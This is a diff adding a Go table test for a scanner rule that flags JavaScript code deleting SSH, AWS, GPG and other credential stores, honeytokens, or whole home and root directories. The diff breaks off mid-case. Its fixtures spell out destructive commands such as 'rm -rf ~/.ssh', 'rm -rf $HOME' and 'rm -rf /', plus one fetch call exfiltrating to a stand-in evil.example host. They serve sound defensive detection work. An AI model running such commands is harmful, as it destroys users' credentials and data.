@@ -3467,3 +3467,966 @@ func TestHostTamper(t *testing.T) {
 		})
 	}
 }
+
+func TestWiperTripwire(t *testing.T) {
+	cases := []struct {
+		name, content string
+		want          bool // expect JS_WIPER_TRIPWIRE_001
+		crit          bool
+	}{
+		// --- true positives: home-only credential/history/honeytoken (HIGH) ---
+		{
+			name:    "fs rmSync .ssh (home-only) -> HIGH",
+			content: "const fs = require('fs');\nfs.rmSync('.ssh', { recursive: true });\n",
+			want:    true,
+		},
+		{
+			name:    "fs rmSync /home/u/.aws -> HIGH",
+			content: "const fs = require('fs');\nfs.rmSync('/home/user/.aws', { recursive: true, force: true });\n",
+			want:    true,
+		},
+		{
+			name:    "fs-extra removeSync .aws -> HIGH",
+			content: "const fse = require('fs-extra');\nfse.removeSync('.aws');\n",
+			want:    true,
+		},
+		{
+			name:    "rimraf .kube -> HIGH",
+			content: "const rimraf = require('rimraf');\nrimraf('.kube', () => {});\n",
+			want:    true,
+		},
+		{
+			name:    "fs.promises destructured rm .gnupg -> HIGH",
+			content: "const { rm } = require('fs').promises;\nawait rm('.gnupg', { recursive: true });\n",
+			want:    true,
+		},
+		{
+			name:    "fs unlinkSync .bash_history -> HIGH",
+			content: "const fs = require('fs');\nfs.unlinkSync('.bash_history');\n",
+			want:    true,
+		},
+		{
+			name:    "fs unlinkSync .canary honeytoken -> HIGH",
+			content: "const fs = require('fs');\nfs.unlinkSync('.canary');\n",
+			want:    true,
+		},
+		{
+			name:    "fs rmSync .canarytokens -> HIGH",
+			content: "const fs = require('fs');\nfs.rmSync('.canarytokens', { recursive: true });\n",
+			want:    true,
+		},
+		{
+			name:    "fs rmSync .docker (home-only) -> HIGH",
+			content: "const fs = require('fs');\nfs.rmSync('/home/dev/.docker', { recursive: true });\n",
+			want:    true,
+		},
+		{
+			name:    "fs rmSync .config/gcloud -> HIGH",
+			content: "const fs = require('fs');\nfs.rmSync('/home/dev/.config/gcloud', { recursive: true });\n",
+			want:    true,
+		},
+		// --- shell home-only ---
+		{
+			name:    "shell rm -rf ~/.gnupg -> HIGH",
+			content: "require('child_process').execSync('rm -rf ~/.gnupg');\n",
+			want:    true,
+		},
+		{
+			name:    "shell find ~/.ssh -delete -> HIGH",
+			content: "require('child_process').execSync('find ~/.ssh -type f -delete');\n",
+			want:    true,
+		},
+		{
+			name:    "spawn sh -c rm -rf ~/.ssh -> HIGH",
+			content: "const cp = require('child_process');\ncp.spawn('sh', ['-c', 'rm -rf ~/.ssh']);\n",
+			want:    true,
+		},
+		{
+			name:    "shelljs exec rm -rf ~/.aws -> HIGH",
+			content: "const sh = require('shelljs');\nsh.exec('rm -rf ~/.aws');\n",
+			want:    true,
+		},
+		// --- project-capable: home-anchored fires (HIGH) ---
+		{
+			name:    "shell unlink ~/.npmrc (anchored) -> HIGH",
+			content: "require('child_process').execSync('unlink ~/.npmrc');\n",
+			want:    true,
+		},
+		{
+			name:    "fs unlinkSync /home/u/.npmrc (anchored) -> HIGH",
+			content: "const fs = require('fs');\nfs.unlinkSync('/home/dev/.npmrc');\n",
+			want:    true,
+		},
+		{
+			name:    "shell rm ~/CLAUDE.md (anchored) -> HIGH",
+			content: "require('child_process').execSync('rm ~/CLAUDE.md');\n",
+			want:    true,
+		},
+		// --- project-capable bare + strong partner -> CRITICAL ---
+		{
+			name:    "delete .env bare + fetch exfil -> CRITICAL",
+			content: "const fs = require('fs');\nfs.unlinkSync('.env');\nfetch('https://evil.example/x', { method: 'POST', body: d });\n",
+			want:    true, crit: true,
+		},
+		// --- home-only + strong partner -> CRITICAL ---
+		{
+			name:    "delete .ssh + Bun second stage -> CRITICAL",
+			content: "const fs = require('fs');\nrequire('child_process').spawn('bun', ['./s.mjs']);\nfs.rmSync('.ssh', { recursive: true });\n",
+			want:    true, crit: true,
+		},
+		// --- broad wipe -> CRITICAL ---
+		{
+			name:    "fs.rmSync(os.homedir()) broad wipe -> CRITICAL",
+			content: "const os = require('os');\nconst fs = require('fs');\nfs.rmSync(os.homedir(), { recursive: true, force: true });\n",
+			want:    true, crit: true,
+		},
+		{
+			name:    "fs.rmSync(process.env.HOME) broad wipe -> CRITICAL",
+			content: "const fs = require('fs');\nfs.rmSync(process.env.HOME, { recursive: true, force: true });\n",
+			want:    true, crit: true,
+		},
+		{
+			name:    "shell rm -rf $HOME -> CRITICAL",
+			content: "require('child_process').execSync('rm -rf $HOME');\n",
+			want:    true, crit: true,
+		},
+		{
+			name:    "shell rm -rf ~ -> CRITICAL",
+			content: "require('child_process').execSync('rm -rf ~');\n",
+			want:    true, crit: true,
+		},
+		{
+			name:    "shell rm -rf / root wipe -> CRITICAL",
+			content: "require('child_process').execSync('rm -rf /');\n",
+			want:    true, crit: true,
+		},
+		{
+			name:    "shell rm -rf /home/dev home root -> CRITICAL",
+			content: "require('child_process').execSync('rm -rf /home/dev');\n",
+			want:    true, crit: true,
+		},
+		// --- two distinct families -> CRITICAL ---
+		{
+			name:    "delete .ssh + .aws (two families) -> CRITICAL",
+			content: "const fs = require('fs');\nfs.rmSync('.ssh', { recursive: true });\nfs.rmSync('.aws', { recursive: true });\n",
+			want:    true, crit: true,
+		},
+		// --- two files SAME family stays HIGH (refinement 1) ---
+		{
+			name:    "delete .ssh/id_rsa + .ssh/known_hosts (one family) -> HIGH",
+			content: "const fs = require('fs');\nfs.unlinkSync('.ssh/id_rsa');\nfs.unlinkSync('.ssh/known_hosts');\n",
+			want:    true, crit: false,
+		},
+		// --- .ssh (fires) + .npmrc bare (does not, no partner): one family HIGH ---
+		{
+			name:    "delete .ssh + bare .npmrc (npmrc quiet) -> HIGH not CRITICAL",
+			content: "const fs = require('fs');\nfs.rmSync('.ssh', { recursive: true });\nfs.unlinkSync('.npmrc');\n",
+			want:    true, crit: false,
+		},
+
+		// --- false positives ---
+		{
+			name:    "rimraf dist is build cleanup",
+			content: "const rimraf = require('rimraf');\nrimraf('dist', () => {});\n",
+			want:    false,
+		},
+		{
+			name:    "rm -rf node_modules is cleanup",
+			content: "require('child_process').execSync('rm -rf node_modules');\n",
+			want:    false,
+		},
+		{
+			name:    "fs.rmSync ./coverage is cleanup",
+			content: "const fs = require('fs');\nfs.rmSync('./coverage', { recursive: true });\n",
+			want:    false,
+		},
+		{
+			name:    "fs.rmSync build is cleanup",
+			content: "const fs = require('fs');\nfs.rmSync('build', { recursive: true });\n",
+			want:    false,
+		},
+		{
+			name:    "/tmp/.ssh fixture under benign dir is not a wipe",
+			content: "const fs = require('fs');\nfs.rmSync('/tmp/.ssh', { recursive: true });\n",
+			want:    false,
+		},
+		{
+			name:    "rm -rf /tmp/project-cache is cleanup",
+			content: "require('child_process').execSync('rm -rf /tmp/project-cache');\n",
+			want:    false,
+		},
+		{
+			name:    ".env.example sibling is not .env",
+			content: "const fs = require('fs');\nfs.unlinkSync('.env.example');\n",
+			want:    false,
+		},
+		{
+			name:    ".npmrc.sample sibling is not .npmrc",
+			content: "const fs = require('fs');\nfs.unlinkSync('.npmrc.sample');\n",
+			want:    false,
+		},
+		{
+			name:    ".ssh.bak sibling is not .ssh",
+			content: "const fs = require('fs');\nfs.unlinkSync('/home/u/.ssh.bak');\n",
+			want:    false,
+		},
+		{
+			name:    "canary.txt is not the .canary honeytoken",
+			content: "const fs = require('fs');\nfs.unlinkSync('canary.txt');\n",
+			want:    false,
+		},
+		{
+			name:    "my-canary-file is not the .canary honeytoken",
+			content: "const fs = require('fs');\nfs.unlinkSync('my-canary-file');\n",
+			want:    false,
+		},
+		{
+			name:    "bare .npmrc no partner stays quiet",
+			content: "const fs = require('fs');\nfs.unlinkSync('.npmrc');\n",
+			want:    false,
+		},
+		{
+			name:    "bare .env no partner stays quiet",
+			content: "const fs = require('fs');\nfs.unlinkSync('.env');\n",
+			want:    false,
+		},
+		{
+			name:    "constructed template prefix ${tmp}/.ssh is not a wipe",
+			content: "const fs = require('fs');\nfs.rmSync(`${tmp}/.ssh`, { recursive: true });\n",
+			want:    false,
+		},
+		{
+			name:    "constructed concat prefix tmp + '/.ssh' is not a wipe",
+			content: "const fs = require('fs');\nfs.rmSync(tmp + '/.ssh', { recursive: true });\n",
+			want:    false,
+		},
+		{
+			name:    "comment mentioning rm -rf ~/.ssh",
+			content: "// cleanup step: rm -rf ~/.ssh if present\nconst x = 1;\n",
+			want:    false,
+		},
+		{
+			name:    "doc string of a delete command is not a call",
+			content: "const example = \"rm -rf ~/.ssh\";\nconsole.log(example);\n",
+			want:    false,
+		},
+		{
+			name:    "db.exec delete is not a bound shell or fs delete",
+			content: "const db = getDb();\ndb.exec(\"rm -rf ~/.ssh\");\n",
+			want:    false,
+		},
+		{
+			name:    "local writer.unlinkSync not bound to fs",
+			content: "const writer = makeWriter();\nwriter.unlinkSync('/home/u/.ssh');\n",
+			want:    false,
+		},
+		{
+			name:    "spawn echo with rm argv data is not a shell delete",
+			content: "const cp = require('child_process');\ncp.spawn('echo', ['rm -rf ~/.ssh']);\n",
+			want:    false,
+		},
+		{
+			name:    "spawn sh script.sh then -c positional is not a shell delete",
+			content: "const cp = require('child_process');\ncp.spawn('sh', ['script.sh', '-c', 'rm -rf ~/.ssh']);\n",
+			want:    false,
+		},
+		{
+			name:    "find ~/.ssh without -delete is a read",
+			content: "require('child_process').execSync('find ~/.ssh -type f');\n",
+			want:    false,
+		},
+		{
+			name:    "npm cache clean is not a sensitive delete",
+			content: "require('child_process').execSync('npm cache clean --force');\n",
+			want:    false,
+		},
+		{
+			name:    "os.tmpdir() delete is not a home wipe",
+			content: "const fs = require('fs');\nfs.rmSync(os.tmpdir(), { recursive: true });\n",
+			want:    false,
+		},
+		{
+			name:    ".git-credentials.bak sibling is not the credential file",
+			content: "const fs = require('fs');\nfs.unlinkSync('/home/u/.git-credentials.bak');\n",
+			want:    false,
+		},
+		{
+			// codex round 1 #1: a sensitive path after another rm operand.
+			name:    "rm -rf dist ~/.ssh (sensitive as later operand) -> HIGH",
+			content: "require('child_process').execSync('rm -rf dist ~/.ssh');\n",
+			want:    true,
+		},
+		{
+			// codex round 1 #1: a sensitive path after the -- sentinel.
+			name:    "rm -rf -- ~/.aws (after -- sentinel) -> HIGH",
+			content: "require('child_process').execSync('rm -rf -- ~/.aws');\n",
+			want:    true,
+		},
+		{
+			// codex round 1 #2: a template suffix extends the component into a
+			// constructed (unknown) path.
+			name:    "fs.rmSync(`.ssh${suffix}`) constructed suffix is not a wipe",
+			content: "const fs = require('fs');\nfs.rmSync(`.ssh${suffix}`, { recursive: true });\n",
+			want:    false,
+		},
+		{
+			// codex round 1 #2 sibling: a concat suffix on the component.
+			name:    "fs.unlinkSync('.ssh' + suffix) concat suffix is not a wipe",
+			content: "const fs = require('fs');\nfs.unlinkSync('.ssh' + suffix);\n",
+			want:    false,
+		},
+		{
+			// codex round 2: an rm command that is only ECHOED (an argument,
+			// not a command position) is not a real delete.
+			name:    "echo of an rm command is not a delete",
+			content: "require('child_process').execSync('echo rm -rf ~/.ssh');\n",
+			want:    false,
+		},
+		{
+			// round 2 regression: a wrapper (sudo) before rm is still a delete.
+			name:    "sudo rm -rf ~/.ssh -> HIGH",
+			content: "require('child_process').execSync('sudo rm -rf ~/.ssh');\n",
+			want:    true,
+		},
+		{
+			// codex round 3 #1: a QUOTED rm inside echo is printed data, not a
+			// command (the inner quote is not a command boundary).
+			name:    "echo of a quoted rm command is not a delete",
+			content: "require('child_process').execSync('echo \"rm -rf ~/.ssh\"');\n",
+			want:    false,
+		},
+		{
+			// codex round 3 #2: ${HOME} is a home anchor for project-capable
+			// files just like $HOME and ~.
+			name:    "rm -rf ${HOME}/.npmrc (anchored) -> HIGH",
+			content: "require('child_process').execSync('rm -rf ${HOME}/.npmrc');\n",
+			want:    true,
+		},
+		{
+			// codex round 4 #1: a globbed root wipe.
+			name:    "shell rm -rf /* root glob wipe -> CRITICAL",
+			content: "require('child_process').execSync('rm -rf /*');\n",
+			want:    true, crit: true,
+		},
+		{
+			// codex round 4 #1: a globbed home wipe.
+			name:    "shell rm -rf $HOME/* home glob wipe -> CRITICAL",
+			content: "require('child_process').execSync('rm -rf $HOME/*');\n",
+			want:    true, crit: true,
+		},
+		{
+			// codex round 4 #1: /tmp/* glob is cleanup, not a wipe.
+			name:    "shell rm -rf /tmp/* glob is cleanup",
+			content: "require('child_process').execSync('rm -rf /tmp/*');\n",
+			want:    false,
+		},
+		{
+			// codex round 4 #2: modern named rimraf import (CJS destructure).
+			name:    "named rimraf destructure delete .ssh -> HIGH",
+			content: "const { rimraf } = require('rimraf');\nawait rimraf('.ssh');\n",
+			want:    true,
+		},
+		{
+			// codex round 4 #2: modern named rimraf import (ESM).
+			name:    "named rimraf ESM import delete .aws -> HIGH",
+			content: "import { rimraf } from 'rimraf';\nawait rimraf('.aws');\n",
+			want:    true,
+		},
+		{
+			// codex round 5 #1: a delete inside an if-condition is real.
+			name:    "shell if rm -rf ~/.ssh condition -> HIGH",
+			content: "require('child_process').execSync('if rm -rf ~/.ssh; then echo ok; fi');\n",
+			want:    true,
+		},
+		{
+			// codex round 5 #1: a delete inside a while-condition is real.
+			name:    "shell while rm -rf ~/.aws condition -> HIGH",
+			content: "require('child_process').execSync('while rm -rf ~/.aws; do :; done');\n",
+			want:    true,
+		},
+		{
+			// codex round 5 #2: Node does not expand ~ in an fs path, so a
+			// literal '~' is a directory named ~, not a home wipe.
+			name:    "fs.rmSync('~') literal tilde dir is not a home wipe",
+			content: "const fs = require('fs');\nfs.rmSync('~', { recursive: true });\n",
+			want:    false,
+		},
+		{
+			// codex round 5 #2: same for a literal '$HOME' fs path.
+			name:    "fs.rmSync('$HOME') literal is not a home wipe",
+			content: "const fs = require('fs');\nfs.rmSync('$HOME', { recursive: true });\n",
+			want:    false,
+		},
+		{
+			// codex round 6 #1: rimraf namespace property call.
+			name:    "rimraf namespace rr.rimraf(.ssh) -> HIGH",
+			content: "const rr = require('rimraf');\nawait rr.rimraf('.ssh');\n",
+			want:    true,
+		},
+		{
+			// codex round 6 #1: rimraf namespace .sync property call.
+			name:    "rimraf namespace rr.sync(.aws) -> HIGH",
+			content: "import * as rr from 'rimraf';\nrr.sync('.aws');\n",
+			want:    true,
+		},
+		{
+			// codex round 6 #2: echo of a wrapper-prefixed rm is printed text;
+			// the wrapper (sudo) must itself be at a command start.
+			name:    "echo sudo rm -rf ~/.ssh is printed text, not a delete",
+			content: "require('child_process').execSync('echo sudo rm -rf ~/.ssh');\n",
+			want:    false,
+		},
+		{
+			// codex round 7 #1: a .. traversal escapes the benign /tmp prefix
+			// and resolves under /home/u/.ssh.
+			name:    "fs.rmSync /tmp/../home/u/.ssh traversal is a real wipe -> HIGH",
+			content: "const fs = require('fs');\nfs.rmSync('/tmp/../home/u/.ssh', { recursive: true });\n",
+			want:    true,
+		},
+		{
+			// codex round 7 #2: $HOME_BACKUP is a different variable, not the
+			// HOME anchor, so the path is constructed/unknown.
+			name:    "shell rm -rf $HOME_BACKUP/.ssh is a constructed path",
+			content: "require('child_process').execSync('rm -rf $HOME_BACKUP/.ssh');\n",
+			want:    false,
+		},
+		{
+			// codex round 7 #2: $HOMEDIR is also a different variable.
+			name:    "shell rm -rf $HOMEDIR/.npmrc is a constructed path",
+			content: "require('child_process').execSync('rm -rf $HOMEDIR/.npmrc');\n",
+			want:    false,
+		},
+		{
+			// codex round 8 #1: an empty string literal is a no-op, not root.
+			name:    "fs.rmSync('') empty literal is not a root wipe",
+			content: "const fs = require('fs');\nfs.rmSync('', { force: true });\n",
+			want:    false,
+		},
+		{
+			// codex round 8 #2: a wrapper option between sudo and rm.
+			name:    "sudo -n rm -rf ~/.ssh -> HIGH",
+			content: "require('child_process').execSync('sudo -n rm -rf ~/.ssh');\n",
+			want:    true,
+		},
+		{
+			// codex round 8 #2: an env assignment before rm.
+			name:    "env FOO=1 rm -rf ~/.aws -> HIGH",
+			content: "require('child_process').execSync('env FOO=1 rm -rf ~/.aws');\n",
+			want:    true,
+		},
+		{
+			// codex round 9: inline require('rimraf').sync(...).
+			name:    "inline require('rimraf').sync('.ssh') -> HIGH",
+			content: "require('rimraf').sync('.ssh');\n",
+			want:    true,
+		},
+		{
+			// codex round 9: inline require('rimraf')(...) (older callable).
+			name:    "inline require('rimraf')('.aws') -> HIGH",
+			content: "require('rimraf')('.aws', () => {});\n",
+			want:    true,
+		},
+		{
+			// codex round 10 #1: rm glued to an assignment value (FOO=rm) is
+			// not a command; the command is echo.
+			name:    "FOO=rm echo ~/.ssh assignment value is not a delete",
+			content: "require('child_process').execSync('FOO=rm echo ~/.ssh');\n",
+			want:    false,
+		},
+		{
+			// codex round 10 #2: combined default rimraf ESM import.
+			name:    "combined default rimraf import delete .ssh -> HIGH",
+			content: "import rimraf, { sync } from 'rimraf';\nawait rimraf('.ssh');\n",
+			want:    true,
+		},
+		{
+			// codex round 11 #1: inline require('os').homedir() broad wipe.
+			name:    "fs.rmSync(require('os').homedir()) broad wipe -> CRITICAL",
+			content: "const fs = require('fs');\nfs.rmSync(require('os').homedir(), { recursive: true, force: true });\n",
+			want:    true, crit: true,
+		},
+		{
+			// codex round 11 #1: a mock object named os is not the os module.
+			name:    "fs.rmSync(os.homedir()) with mock os is not a home wipe",
+			content: "const os = { homedir: () => '/tmp/build' };\nconst fs = require('fs');\nfs.rmSync(os.homedir(), { recursive: true });\n",
+			want:    false,
+		},
+		{
+			// codex round 11 #2: a local helper ending in 'require' is not the
+			// module require.
+			name:    "myrequire('rimraf')('.ssh') is not a bound rimraf delete",
+			content: "const myrequire = makeRequire();\nmyrequire('rimraf')('.ssh');\n",
+			want:    false,
+		},
+		{
+			// codex round 12 #1: /home/<u> where the username matches a benign
+			// dir name (tmp) is still a real home credential wipe.
+			name:    "fs.rmSync /home/tmp/.ssh (username tmp) -> HIGH",
+			content: "const fs = require('fs');\nfs.rmSync('/home/tmp/.ssh', { recursive: true });\n",
+			want:    true,
+		},
+		{
+			// codex round 13 #1: a filtered find rooted at $HOME deletes
+			// matching files, not the home root -> not a broad wipe.
+			name:    "find $HOME -name '*.log' -delete is filtered cleanup",
+			content: "require('child_process').execSync('find $HOME -name \"*.log\" -delete');\n",
+			want:    false,
+		},
+		{
+			// codex round 13 #1 regression: find rooted at a sensitive path
+			// still fires.
+			name:    "find ~/.ssh -type f -delete -> HIGH",
+			content: "require('child_process').execSync('find ~/.ssh -type f -delete');\n",
+			want:    true,
+		},
+		{
+			// codex round 14 #1: an fs glob literal is not shell-expanded, so
+			// /home/u/* is a literal path, not a home wipe.
+			name:    "fs.rmSync('/home/u/*') literal glob is not a wipe",
+			content: "const fs = require('fs');\nfs.rmSync('/home/u/*', { recursive: true });\n",
+			want:    false,
+		},
+		{
+			// codex round 14 #2: find with multiple roots must scan each.
+			name:    "find /tmp ~/.ssh -type f -delete (second root sensitive) -> HIGH",
+			content: "require('child_process').execSync('find /tmp ~/.ssh -type f -delete');\n",
+			want:    true,
+		},
+		{
+			// codex round 14 #3: a wrapper option that takes a value
+			// (sudo -u root) still precedes a real delete.
+			name:    "sudo -u root rm -rf ~/.ssh -> HIGH",
+			content: "require('child_process').execSync('sudo -u root rm -rf ~/.ssh');\n",
+			want:    true,
+		},
+		{
+			// codex round 15 #1: a partially quoted home glob ("$HOME"/*).
+			name:    `shell rm -rf "$HOME"/* partial-quote home glob -> CRITICAL`,
+			content: "require('child_process').execSync('rm -rf \"$HOME\"/*');\n",
+			want:    true, crit: true,
+		},
+		{
+			// codex round 15 #2: find with a leading global option (-L).
+			name:    "find -L ~/.ssh -type f -delete (leading option) -> HIGH",
+			content: "require('child_process').execSync('find -L ~/.ssh -type f -delete');\n",
+			want:    true,
+		},
+		{
+			// codex round 16 #1: a shell command assembled by concatenation is
+			// dynamic; a later fragment is not a real operand.
+			name:    "execSync('rm -rf ' + tmp + '/.ssh') concat command is not a wipe",
+			content: "require('child_process').execSync('rm -rf ' + tmp + '/.ssh');\n",
+			want:    false,
+		},
+		{
+			// codex round 16 #2: Node does not expand ~ in an fs literal, so
+			// '~/.ssh' is a literal path, not the home credential store.
+			name:    "fs.rmSync('~/.ssh') literal tilde prefix is not a home path",
+			content: "const fs = require('fs');\nfs.rmSync('~/.ssh', { recursive: true });\n",
+			want:    false,
+		},
+		{
+			// codex round 16 #2: same for a literal $HOME prefix in fs.
+			name:    "fs.unlinkSync('$HOME/.aws') literal is not a home path",
+			content: "const fs = require('fs');\nfs.unlinkSync('$HOME/.aws');\n",
+			want:    false,
+		},
+		{
+			// codex round 17: a -delete substring in a filename pattern is not
+			// the find -delete predicate.
+			name:    "find ~/.ssh -name '*-delete' (no real -delete) is a read",
+			content: "require('child_process').execSync(\"find ~/.ssh -name '*-delete'\");\n",
+			want:    false,
+		},
+		{
+			// codex round 18 #1: a concatenated -c script is dynamic; the
+			// sibling .ssh.bak suffix must not be read as .ssh.
+			name:    "spawn sh -c concat script ('rm -rf ~/.ssh' + '.bak') is not a wipe",
+			content: "const cp = require('child_process');\ncp.spawn('sh', ['-c', 'rm -rf ~/.ssh' + '.bak']);\n",
+			want:    false,
+		},
+		{
+			// codex round 18 #2: in an fs path * is a literal byte, so .ssh* is
+			// a different file than .ssh.
+			name:    "fs.rmSync('/home/u/.ssh*') literal glob byte is not .ssh",
+			content: "const fs = require('fs');\nfs.rmSync('/home/u/.ssh*', { recursive: true });\n",
+			want:    false,
+		},
+		{
+			// codex round 19 #2: a concatenated execaCommand is dynamic.
+			name:    `execaCommand('sh -c "rm -rf ~/.ssh"' + '.bak') concat is not a wipe`,
+			content: "const { execaCommand } = require('execa');\nawait execaCommand('sh -c \"rm -rf ~/.ssh\"' + '.bak');\n",
+			want:    false,
+		},
+		{
+			// PR scope (spec): a direct program-API delete spawn('rm', [...])
+			// is intentionally out of scope (no argv parsing) and stays quiet.
+			name:    "spawn('rm', ['-rf', '/home/u/.ssh']) program-API delete is out of scope",
+			content: "const cp = require('child_process');\ncp.spawnSync('rm', ['-rf', '/home/u/.ssh']);\n",
+			want:    false,
+		},
+		{
+			// codex round 20 #1: an fs path with a method-call tail is dynamic.
+			name:    "fs.rmSync('.ssh'.replace(...)) method-call tail is not a wipe",
+			content: "const fs = require('fs');\nfs.rmSync('.ssh'.replace('.ssh', '.ssh.bak'), { recursive: true });\n",
+			want:    false,
+		},
+		{
+			// codex round 20 #2: an argv -c script with a method-call tail.
+			name:    "spawn sh -c script with .replace tail is not a wipe",
+			content: "const cp = require('child_process');\ncp.spawn('sh', ['-c', 'rm -rf ~/.ssh'.replace('.ssh', '.ssh.bak')]);\n",
+			want:    false,
+		},
+		{
+			// codex round 20 #3: a delete inside backtick command substitution
+			// is executed.
+			name:    "shell echo `rm -rf ~/.ssh` command substitution -> HIGH",
+			content: "require('child_process').execSync('echo `rm -rf ~/.ssh`');\n",
+			want:    true,
+		},
+		{
+			// codex round 21 #1: a shell glob expands, so rm -rf ~/.ssh* can
+			// delete ~/.ssh (the * is a boundary for shell, literal for fs).
+			name:    "shell rm -rf ~/.ssh* glob -> HIGH",
+			content: "require('child_process').execSync('rm -rf ~/.ssh*');\n",
+			want:    true,
+		},
+		{
+			// review P1: unlink cannot remove a directory, so unlinkSync of a
+			// home directory is inert, not a broad wipe.
+			name:    "fs.unlinkSync('/home/dev') cannot remove a directory",
+			content: "const fs = require('fs');\nfs.unlinkSync('/home/dev');\n",
+			want:    false,
+		},
+		{
+			// review P1: unlink of literal root is inert.
+			name:    "fs.unlinkSync('/') cannot remove root",
+			content: "const fs = require('fs');\nfs.unlinkSync('/');\n",
+			want:    false,
+		},
+		{
+			// review P1: unlink of a credential-store directory is inert.
+			name:    "fs.unlinkSync('.ssh') (a directory) is inert",
+			content: "const fs = require('fs');\nfs.unlinkSync('.ssh');\n",
+			want:    false,
+		},
+		{
+			// review P1: removeSync is fs-extra, not core fs, so a core fs
+			// binding cannot call it.
+			name:    "core fs.removeSync('.ssh') is not a real method",
+			content: "const fs = require('fs');\nfs.removeSync('.ssh');\n",
+			want:    false,
+		},
+		{
+			// review P1 regression: fs-extra binding CAN call removeSync.
+			name:    "fs-extra removeSync('.ssh') -> HIGH",
+			content: "const fse = require('fs-extra');\nfse.removeSync('.ssh');\n",
+			want:    true,
+		},
+		{
+			// review P1 regression: unlink of a FILE inside a sensitive dir is a
+			// real delete (the target is a file, not the directory).
+			name:    "fs.unlinkSync('.ssh/id_rsa') (a file) -> HIGH",
+			content: "const fs = require('fs');\nfs.unlinkSync('.ssh/id_rsa');\n",
+			want:    true,
+		},
+		{
+			// review P2: a backtick template `${HOME}` is JS interpolation of a
+			// JS const, not a shell variable, so the command is dynamic.
+			name:    "execSync template literal ${HOME}/.npmrc is JS interpolation, not shell",
+			content: "const HOME = '/tmp/build';\nrequire('child_process').execSync(`rm -rf ${HOME}/.npmrc`);\n",
+			want:    false,
+		},
+		{
+			// review round 2 P1: fs.rm without { recursive: true } cannot remove
+			// a populated home directory, so it is not a broad wipe.
+			name:    "fs.rmSync(os.homedir()) without recursive cannot wipe home",
+			content: "const os = require('os');\nconst fs = require('fs');\nfs.rmSync(os.homedir());\n",
+			want:    false,
+		},
+		{
+			// review round 2 P1: fs.rm without recursive cannot remove the .ssh
+			// directory.
+			name:    "fs.rmSync('.ssh') without recursive cannot remove a directory",
+			content: "const fs = require('fs');\nfs.rmSync('.ssh');\n",
+			want:    false,
+		},
+		{
+			// review round 2 P1: shell rm without -r cannot remove a directory.
+			name:    "shell rm ~/.ssh without -r cannot remove a directory",
+			content: "require('child_process').execSync('rm ~/.ssh');\n",
+			want:    false,
+		},
+		{
+			// review round 2 P1: rmdir removes only empty/final dirs, so rmdir of
+			// root (always populated) is inert, not a broad wipe.
+			name:    "shell rmdir / is not a recursive broad wipe",
+			content: "require('child_process').execSync('rmdir /');\n",
+			want:    false,
+		},
+		{
+			// review round 2 P1: fs.rmdirSync of root cannot recursively wipe.
+			name:    "fs.rmdirSync('/') is not a recursive broad wipe",
+			content: "const fs = require('fs');\nfs.rmdirSync('/');\n",
+			want:    false,
+		},
+		{
+			// review round 2 P1 positive: rm -rf is recursive, so ~/.ssh fires.
+			name:    "shell rm -rf ~/.ssh recursive directory delete -> HIGH",
+			content: "require('child_process').execSync('rm -rf ~/.ssh');\n",
+			want:    true,
+		},
+		{
+			// review round 2 P1 positive: fs.rm with { recursive: true } removes
+			// the .ssh directory.
+			name:    "fs.rmSync('.ssh', { recursive: true }) -> HIGH",
+			content: "const fs = require('fs');\nfs.rmSync('.ssh', { recursive: true });\n",
+			want:    true,
+		},
+		{
+			// review round 2 P1 positive: recursive rm of the home root is a
+			// broad wipe -> CRITICAL.
+			name:    "fs.rmSync(os.homedir(), { recursive: true }) broad wipe -> CRITICAL",
+			content: "const os = require('os');\nconst fs = require('fs');\nfs.rmSync(os.homedir(), { recursive: true, force: true });\n",
+			want:    true,
+			crit:    true,
+		},
+		{
+			// review round 2 capability check: rmdir is directory-final capable,
+			// so attempting to remove the .ssh directory fires.
+			name:    "shell rmdir ~/.ssh (directory-final) -> HIGH",
+			content: "require('child_process').execSync('rmdir ~/.ssh');\n",
+			want:    true,
+		},
+		{
+			// review round 2 capability check: a flag-less rm still deletes a
+			// FILE, so a home-anchored credential file fires.
+			name:    "shell rm ~/.npmrc (a file, no -r needed) -> HIGH",
+			content: "require('child_process').execSync('rm ~/.npmrc');\n",
+			want:    true,
+		},
+		{
+			// review round 3 P2: { recursive: false } does not enable recursion,
+			// so it cannot remove a directory.
+			name:    "fs.rmSync('.ssh', { recursive: false }) cannot remove a directory",
+			content: "const fs = require('fs');\nfs.rmSync('.ssh', { recursive: false });\n",
+			want:    false,
+		},
+		{
+			// review round 3 P2: { recursive: false } cannot wipe the home root.
+			name:    "fs.rmSync(os.homedir(), { recursive: false }) cannot wipe home",
+			content: "const os = require('os');\nconst fs = require('fs');\nfs.rmSync(os.homedir(), { recursive: false });\n",
+			want:    false,
+		},
+		{
+			// review round 3 P2: a trailing slash still names the directory, so
+			// unlink (file-only) cannot remove it.
+			name:    "fs.unlinkSync('/home/u/.ssh/') trailing slash is still the directory",
+			content: "const fs = require('fs');\nfs.unlinkSync('/home/u/.ssh/');\n",
+			want:    false,
+		},
+		{
+			// review round 3 P2: shell rm without -r cannot remove ~/.ssh/ even
+			// with a trailing slash.
+			name:    "shell rm ~/.ssh/ trailing slash without -r cannot remove a directory",
+			content: "require('child_process').execSync('rm ~/.ssh/');\n",
+			want:    false,
+		},
+		{
+			// review round 3 positive: a recursive rm of ~/.ssh/ (trailing slash)
+			// still fires.
+			name:    "shell rm -rf ~/.ssh/ trailing slash recursive -> HIGH",
+			content: "require('child_process').execSync('rm -rf ~/.ssh/');\n",
+			want:    true,
+		},
+		{
+			// review round 3 positive: a quoted recursive option key still grants
+			// recursion.
+			name:    "fs.rmSync('.aws', { \"recursive\": true }) quoted key -> HIGH",
+			content: "const fs = require('fs');\nfs.rmSync('.aws', { \"recursive\": true });\n",
+			want:    true,
+		},
+		{
+			// review round 4 P2: a relative fixture path that merely contains a
+			// `home` segment is not home-anchored, so a project-capable file
+			// (.npmrc) needs a partner.
+			name:    "relative vendor/home/user/.npmrc is not home-anchored",
+			content: "const fs = require('fs');\nfs.unlinkSync('vendor/home/user/.npmrc');\n",
+			want:    false,
+		},
+		{
+			// review round 4 P2: same for a `Users` segment in a relative path.
+			name:    "relative fixtures/Users/alice/.env is not home-anchored",
+			content: "const fs = require('fs');\nfs.unlinkSync('fixtures/Users/alice/.env');\n",
+			want:    false,
+		},
+		{
+			// review round 4 P2: fs/promises has no *Sync methods, so the call
+			// does not exist and deletes nothing.
+			name:    "fs/promises alias rmSync does not exist",
+			content: "const fs = require('fs/promises');\nfs.rmSync('.ssh', { recursive: true });\n",
+			want:    false,
+		},
+		{
+			// review round 4 P2: fs.promises namespace rmSync does not exist.
